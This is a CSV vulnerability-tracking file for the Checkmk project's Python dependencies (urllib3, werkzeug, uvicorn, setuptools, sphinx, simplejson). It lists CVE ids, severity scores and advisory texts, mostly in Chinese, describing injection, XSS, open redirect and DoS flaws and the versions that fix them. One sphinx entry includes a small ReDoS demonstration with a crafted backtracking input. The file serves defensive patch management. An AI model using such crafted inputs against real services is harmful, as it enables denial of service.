project,dependency,dependency_version,direct_dependency,cve_id,cwe_id,release_date,description,security_level_id,exploit_level_id
Checkmk_checkmk,setuptools,,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
Checkmk_checkmk,setuptools,,True,,,,<p>setuptools 是一个用于 Python 包管理和构建的工具，它简化了包的创建和分发过程。此漏洞的根本原因是使用了已弃用的函数 `tempfile.mktemp()`，该函数不安全，因为在调用 mktemp() 和随后尝试创建文件之间，另一个进程可能会创建一个具有相同名称的文件。这种函数在创建临时文件名时不确保对返回的临时名称的独占访问性，操作之间没有原子性保证，从而为攻击者提供了干扰文件的机会，可能在文件打开之前进行篡改。</p>,3,1
Checkmk_checkmk,simplejson,,True,CVE-2014-4616,CWE-129,2014-06-20,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。simplejson是一个可扩展的JSON解码/编码器。_json module是其中的一个数据交换模块。
Python 2.7版本至3.5版本和simplejson 2.6.1之前的版本中的_json模块的‘scanstring’函数存在安全漏洞。本地攻击者可通过向‘raw_decode’函数发送带有负的指针值的‘idx’参数利用该漏洞读取任意的进程内存。",3,0
Checkmk_checkmk,urllib3,,True,,CWE-453,2020-12-02,"## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Insecure Defaults. The default SSL/TLS settings were insecure.
## Remediation
Upgrade `urllib3` to version 1.8 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2088570a293df42b1623dd74fcff0174d0565af5)
",3,2
Checkmk_checkmk,urllib3,,True,CVE-2020-26137,CWE-74,2020-09-29,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.25.9之前版本存在注入漏洞。该漏洞源于可以在putrequest()的第一个参数中插入CR和LF控制字符。</p>,3,2
Checkmk_checkmk,urllib3,,True,CVE-2019-11324,CWE-295,2019-04-18,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本中存在信任管理问题漏洞。该漏洞源于网络系统或产品中缺乏有效的信任管理机制。攻击者可利用默认密码或者硬编码密码、硬编码证书等攻击受影响组件。",2,2
Checkmk_checkmk,urllib3,,True,CVE-2019-11236,CWE-93,2019-04-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.24.1及之前版本版本中存在注入漏洞，该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。</p>,3,0
Checkmk_checkmk,urllib3,,True,CVE-2018-20060,CWE-288,2018-12-11,"urllib3是一个基于Python的HTTP库，它具有线程安全连接池和文件后期支持等功能。
urllib3 1.23之前版本中存在安全漏洞，该漏洞源于程序在进行跨源重定向时，没有移除Authorization HTTP报头，导致授权报头中的凭证暴露给其他主机或以明文的形式传输。攻击者可利用该漏洞获取敏感信息。",1,2
Checkmk_checkmk,urllib3,,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
Checkmk_checkmk,urllib3,,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
Checkmk_checkmk,urllib3,,True,CVE-2018-25091,CWE-601,2023-10-15,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本存在安全漏洞，该漏洞源于允许攻击者获取授权标头中的凭据或以明文形式传输凭据。",3,0
Checkmk_checkmk,urllib3,,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
Checkmk_checkmk,urllib3,,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
Checkmk_checkmk,urllib3,,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
Checkmk_checkmk,uvicorn,,True,CVE-2020-7695,CWE-74,2020-07-20,"Encode OSS Uvicorn是英国Encode OSS公司的一款基于uvloop和httptools构建的ASGI（Web服务器网关接口）服务器。
Encode OSS Uvicorn 0.11.7之前版本中存在注入漏洞，该漏洞源于程序没有转义HTTP标头中的CRLF序列。攻击者可利用该漏洞向HTTP相应中添加任意标头或使其返回任意相应主体。",2,2
Checkmk_checkmk,uvicorn,,True,,CWE-362,2023-08-01,"## Overview
[uvicorn](https://github.com/encode/uvicorn) is a lightning-fast ASGI server.

Affected versions of this package are vulnerable to Race Condition in the `uvicorn/protocols/http` component that leads Quart to hang with uvicorn. This vulnerability may allow an attacker to disrupt the server's response handling process under certain conditions, leading to potential Denial of Service (DoS) or other adverse impacts.
## Remediation
Upgrade `uvicorn` to version 0.12.3 or higher.
## References
- [GitHub Commit](https://github.com/encode/uvicorn/commit/de213614b7f8309f411e30a31d274d01b129607d)
- [GitHub PR](https://github.com/encode/uvicorn/pull/848)
- [GitHub Release](https://github.com/encode/uvicorn/releases/tag/0.12.3)
",3,0
Checkmk_checkmk,uvicorn,,True,CVE-2020-7694,CWE-94 CWE-116,2020-07-20,"Encode OSS Uvicorn是英国Encode OSS公司的一款基于uvloop和httptools构建的ASGI（Web服务器网关接口）服务器。
Encode OSS uvicorn（所有版本）中存在安全漏洞。攻击者可借助特制的URL利用该漏洞污染uvicorn的访问日志，影响此类文件的完整性。",2,0
Checkmk_checkmk,werkzeug,,True,CVE-2023-25577,CWE-770,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于Werkzeug multipart表单数据解析器可以解析无限数量的文件、字节部分，但每个部分都需要 CPU 时间来解析，并且可能会使用更多内存，如果向 `request.data`、`request.form`、`request.files` 或 `request.get_data(parse_form_data=False)` 的端点发出请求，则可能会导致意外的高资源使用率，攻击者利用该漏洞可以导致拒绝服务。",2,2
Checkmk_checkmk,werkzeug,,True,CVE-2023-23934,CWE-20,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于浏览器可能允许看起来像“=value”而不是“key=value”的“无名”cookie。",4,0
Checkmk_checkmk,werkzeug,,True,CVE-2022-29361,CWE-444,2022-05-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.1.0版本及之前版本存在环境问题漏洞，该漏洞源于不正确解析 HTTP 的请求。攻击者利用该漏洞通过特制的 HTTP 请求执行 HTTP 请求走私。",1,1
Checkmk_checkmk,werkzeug,,True,,CWE-310,2020-04-03,"## Overview
[Werkzeug](https://werkzeug.palletsprojects.com/) is a WSGI web application library.

Affected versions of this package are vulnerable to Insufficient Randomness. `SHA1` hash algorithm is used with 1000 rounds for hashing. This deviates from security best practice.
## Remediation
Upgrade `Werkzeug` to version 0.12 or higher.
## References
- [GitHub PR](https://github.com/pallets/werkzeug/pull/753)
",4,0
Checkmk_checkmk,werkzeug,,True,,CWE-331,2020-04-03,"## Overview
[Werkzeug](https://werkzeug.palletsprojects.com/) is a WSGI web application library.

Affected versions of this package are vulnerable to Insufficient Entropy. Secure cookies created as part of  ` werkzeug.contrib.securecookie` were generate through weak hashing which deviates from security best practice.
## Remediation
Upgrade `Werkzeug` to version 0.3.1 or higher.
## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/84eabcaa81f60d47939ac2d43f01d01eeab598a4)
- [GitHub Release Notes](https://github.com/pallets/werkzeug/blob/master/CHANGES.rst#version-031)
",4,0
Checkmk_checkmk,werkzeug,,True,CVE-2016-10516,CWE-79,2017-10-23,"Pallets Flask是Pallets项目中的一个基于Python的Web应用开发工具。Pallets Werkzeug是其中的一个WSGI工具包。
Pallets Flask和其他产品中使用的Pallets Werkzeug 0.11.11之前的版本的debugger的debug/tbtools.py文件的‘render_full’函数存在跨站脚本漏洞。远程攻击者可借助带有异常消息的字段利用该漏洞注入任意的Web脚本或HTML。",3,0
Checkmk_checkmk,werkzeug,,True,,CWE-113,2017-12-04,"## Overview
Affected versions of [`werkzeug`](https://pypi.python.org/pypi/werkzeug) are vulnerable to HTTP Response Splitting.
It allows newline characters in values in the header. An attacker can leverage this to inject arbitrary headers and conduct HTTP response splitting attacks.

## Remediation
Upgrade `werkzeug` to version 0.8 or higher.

## References
- [GitHub Changelog](https://github.com/pallets/werkzeug/blob/master/CHANGES#L722)
- [Github Commit](https://github.com/pallets/werkzeug/commit/694aae3ec2b73292ffe6ab960807bc8cf8474b81)
",3,2
Checkmk_checkmk,werkzeug,,True,,CWE-79,2016-08-31,"## Overview
[`werkzeug`](https://pypi.python.org/pypi/werkzeug) is the Swiss Army knife of Python web development.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks via the `plaintext` variable in the debug page.

## Details
A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

ֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.


## References
- [GitHub PR](https://github.com/pallets/werkzeug/pull/1001)
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/1034edc7f901dd645ec6e462754111b39002bd65)
",3,2
Checkmk_checkmk,werkzeug,,True,,CWE-79,2012-02-05,"## Overview
[`werkzeug`](https://pypi.python.org/pypi/werkzeug) is the Swiss Army knife of Python web development.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks due to the lack of sanitization of the redirect url links.

## Details
A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

ֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.


## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/7b8d887d33c768a77f40dd15ff5ac6ebbbab25b9)
",3,2
Checkmk_checkmk,werkzeug,,True,CVE-2020-28724,CWE-601,2020-11-18,"Pallets Werkzeug是一款WSGI Web应用程序库。
werkzeug 0.11.6之前版本存在安全漏洞，该漏洞源于在URL中通过双斜杠打开重定向漏洞。",3,0
Checkmk_checkmk,werkzeug,,True,CVE-2023-46136,CWE-400 CWE-407 CWE-787,2023-10-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 3.0.1之前版本存在安全漏洞，该漏洞源于允许攻击者通过将精心设计的多部分数据发送导致拒绝服务。",2,0
Checkmk_checkmk,werkzeug,,True,CVE-2019-14322,CWE-22,2019-07-28,Pallets Werkzeug 是一款WSGI Web应用程序库，提供了用于开发Web应用的工具和功能。在Pallets Werkzeug 0.15.5之前的版本中，SharedDataMiddleware组件存在安全漏洞。该漏洞的根本原因是SharedDataMiddleware错误处理了在Windows路径名称中的驱动程序名（例如：C:）。攻击者可以利用这一漏洞，通过构造特殊请求来访问服务器上的任意文件，导致信息泄露。,2,1
Checkmk_checkmk,werkzeug,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to slow multipart parsing for large parts.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `werkzeug` to version 3.0.1 or higher.
## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1)
",2,2
Checkmk_checkmk,werkzeug,,True,CVE-2019-14806,CWE-331,2019-08-09,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 0.15.3之前版本中存在安全漏洞，该漏洞源于Docker容器中调试程序PIN码随机不充分。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",2,2
Checkmk_checkmk,werkzeug,,True,CVE-2024-34069,CWE-352,2024-05-06,"Werkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3.",2,0
Checkmk_checkmk,werkzeug,,True,CVE-2024-49766,CWE-22,2024-10-25,Werkzeug 是 Pallets 开发的一个开源全面的WSGI Web应用程序库。在Werkzeug 3.0.6之前的版本中，存在一个路径遍历漏洞。该漏洞的根本原因是，当在Windows系统上且Python版本小于3.11时，os.path.isabs函数无法正确检测UNC路径。这可能导致Werkzeug的safe_join函数生成不安全的路径，从而允许潜在的非预期数据访问。,3,2
Checkmk_checkmk,werkzeug,,True,CVE-2024-49767,CWE-400 CWE-770,2024-10-25,Werkzeug 是一个由 Pallets 开源的全面的 WSGI web 应用程序库，旨在为开发人员提供简单、灵活的工具来搭建 Web 应用程序。在 Werkzeug 3.0.6 之前的版本中，当解析 multipart/form-data 请求时存在拒绝服务漏洞。攻击者可以通过构建特制的请求来耗尽服务器资源，从而导致服务无法响应。,3,2
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
Checkmk_checkmk,sphinx,,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
Checkmk_checkmk,sphinx,,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
Checkmk_checkmk,sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
